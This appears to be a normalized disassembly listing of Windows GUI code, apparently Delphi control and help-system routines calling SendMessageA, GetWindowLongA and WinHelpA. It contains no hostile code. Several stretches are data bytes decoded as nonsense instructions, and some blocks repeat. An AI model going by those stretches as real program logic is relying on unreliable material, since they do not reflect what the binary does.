call sub_453e1c
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_44698c
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_454120
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_464dc0
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_44e7e8
sub_4469c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_446874
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450bd4
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_446a28
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_453298
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_464ca8
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_403370
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403370
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446a95
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446b0e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464d50
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4532a0
mov eax ebx
mov si 0xffb8
call sub_403370
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_403370
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446b15
sub_446b1c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_4532a8
pop edi
pop esi
pop ebx
retn
sub_446b70
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43fdc4
call sub_43fea4
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_446b9c
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43fdc4
mov ebx eax
mov eax ebx
call sub_43fea4
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_453e1c
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43ffa4
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446be8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4466b8
mov edx 0x61
mov eax esi
call sub_44cdf0
mov edx 0x11
mov eax esi
call sub_44ce14
mov dl 0x1
mov eax esi
call sub_454050
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_446c54
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403370
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_446c80
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_446d08
retn
mov dl 0x2
call sub_446d08
jmp r-xdata
xor edx edx
call sub_446d08
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_446d08
jmp r-xdata
sub_446d08
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_454120
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403370
sub_446d5c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_446874
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_450bd4
mov eax ebx
mov si 0xffc8
call sub_403370
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_446db7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5fed173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
pop ebx
retn
sub_446e00
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_446e8e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464d50
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4532a0
mov eax ebx
mov si 0xffb8
call sub_403370
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_403370
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446e95
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_446eac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4466b8
mov edx 0x71
mov eax esi
call sub_44cdf0
mov edx 0x11
mov eax esi
call sub_44ce14
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_446f14
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_403370
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_446f54
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_450b4c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_450b10
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_459edc
sub_447010
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_454050
mov eax [ ebp - 0x4 ]
call sub_454120
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
push ebp
call sub_446f54
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44d240
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403370
sub_44709c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_446874
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_450bd4
mov eax ebx
mov si 0xffc8
call sub_403370
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_4470f3
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x6329173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
pop ebx
retn
sub_447128
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_44719d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_44d634
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_464d50
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_4532a0
mov eax ebx
mov si 0xffb8
call sub_403370
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4471a4
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_4471ac
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403370
jmp r-xdata
pop esi
retn
sub_4471dc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_447201
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447208
retn
sub_447308
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_459d2c
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_447344
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_447369
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447370
retn
sub_447414
cmc
jae r-xdata
add [ esi - 0x6d ] ah
cld
add bh bh
jae r-xdata
push [ ebx + 0x44 ]
cmp dl [ esp + esi * 2 ]
inc esp
add [ eax ] ah
add [ eax ] al
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add [ ecx ] cl
je r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
add [ ebp - 0x4affbb8d ] ch
jae r-xdata
aad 0x73
inc esp
cmp dl [ esp + esi * 2 ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ ebp - 0x3affbb8d ] bh
jae r-xdata
jns r-xdata
adc [ ebx + 0x4fc000b9 ] esp
add ch ah
jae r-xdata
movsd [ edi ] [ esi ]
cmp dl [ esp + esi * 2 ]
inc esp
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
je r-xdata
add [ eax ] al
add [ eax ] al
add ch cl
jae r-xdata
ror [ edi + 0x79 ] 0xad
add ch ch
jae r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
add [ ebp + 0x3004473 ] al
add [ eax ] al
add [ edi + edi * 2 + 0xe0044 ] bl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
lodsb [ esi ]
adc [ eax ] al
adc al 0x0
add [ eax + 0x74 ] bl
inc esp
add [ eax ] al
add [ eax ] al
add ah bh
je r-xdata
add [ esi - 0x6d ] ah
cld
add ch dl
jae r-xdata
add [ ebp - 0x6affbb8d ] cl
jae r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f84
cmp [ ebx + 0x1c ] 0x0
je r-xdata
add [ eax ] al
dec eax
movsd [ edi ] [ esi ]
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] dl
jne r-xdata
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
add ch bl
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + edx * 4 - 0x4 ] ah
jae r-xdata
add [ ebp - 0x5affbb8d ] bl
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4475dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eec
test edi edi
jne r-xdata
add [ eax + eax ] ah
add [ eax ] al
int3
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4475e4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40426c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4474f1
push edi
inc eax
add [ eax ] ch
xor [ eax ] eax
pushfd
jg r-xdata
add [ edi + edi * 8 + 0x30 ] ah
mov [ fs : eax ] esp
mov eax esi
call sub_403eec
test edi edi
jne r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx + 0x140040 ] ch
add [ eax ] al
dec eax
movsd [ edi ] [ esi ]
inc edx
add [ eax + eax ] bl
add [ eax ] al
push cs
push esp
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
imul esp [ ebp + 0x77 ] 0x408d7265
add [ ebp - 0x75 ] dl
in al dx
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4475dd
push [ fs : eax ]
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f84
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4475e4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40426c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_447528
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4475dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403eec
test edi edi
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_403f84
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_403f40
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4475e4
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x1c ]
push [ ebp - 0x8 ]
push r-xdata
push [ ebp - 0x4 ]
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40426c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
sub_4475f8
push ebx
mov ebx eax
mov eax ebx
call sub_447928
cmp [ ebx + 0x1c ] 0x0
je r-xdata
pop ebx
retn
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
lea eax [ ebx + 0x1c ]
call sub_405758
sub_447634
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44769b
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ebx 0x1
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_447528
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0xc ]
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
mov ebx 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4476a2
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_4476ac
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_447734
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov ebx eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_447620
push [ ebp - 0x8 ]
push r-xdata
push edi
lea eax [ ebp - 0x4 ]
mov edx 0x3
call sub_40426c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx edi
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44773b
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
sub_447747
inc [ edx ]
add [ eax ] al
add [ edx ] bh
and [ eax ] al
add [ eax + 0x5590c301 ] dh
mov ebp esp
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4477cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_447e6c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4477d6
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
mov [ ebx + 0x10 ] 0x2
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_447528
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_4477dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4478d4
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_447528
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408c7c
mov eax ebx
call sub_447e6c
test al al
je r-xdata
mov ecx sub_44737c
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4478db
lea eax [ ebp - 0x1c ]
call sub_403eec
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f10
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_447528
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_447dc4
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_403f40
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_447944
push ebx
mov ebx eax
mov eax ebx
call sub_447928
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405758
pop ebx
retn
mov eax rw-data
call sub_405758
sub_447974
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4479cc
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4479d3
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_447528
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_4479dc
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447ad2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408c3c
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_447528
mov eax ebx
call sub_447e6c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ad9
lea eax [ ebp - 0x110 ]
call sub_403eec
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40415c
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_447dc4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_40415c
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_447af0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_447b52
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447b59
lea eax [ ebp - 0x8 ]
call sub_403eec
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_447528
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_447b64
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_447be4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_447528
mov eax ebx
call sub_447e6c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447beb
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_447dc4
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_447bf4
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_447cdf
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_447e6c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_447ce6
lea eax [ ebp - 0x14 ]
mov edx 0x3
call sub_403f10
retn
cmp di 0x102
je r-xdata
push 0x0
lea edx [ ebp - 0xc ]
movzx eax di
call sub_407f80
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax esi
call sub_447dc4
jmp r-xdata
cmp di 0x105
je r-xdata
test al al
je r-xdata
cmp di 0x201
je r-xdata
mov [ esi + 0x10 ] 0x1
lea edx [ ebp - 0x10 ]
movzx eax di
call sub_407f80
mov edx [ ebp - 0x10 ]
lea eax [ esi + 0x14 ]
call sub_403f40
mov eax [ ebp + 0x8 ]
push eax
movzx eax di
push eax
lea ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_447528
mov eax [ ebp - 0x14 ]
call sub_4043ac
push eax
mov eax [ ebp - 0x4 ]
push eax
call WinHelpA
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp di 0xa
je r-xdata
cmp di 0x8
je r-xdata
cmp di 0x1
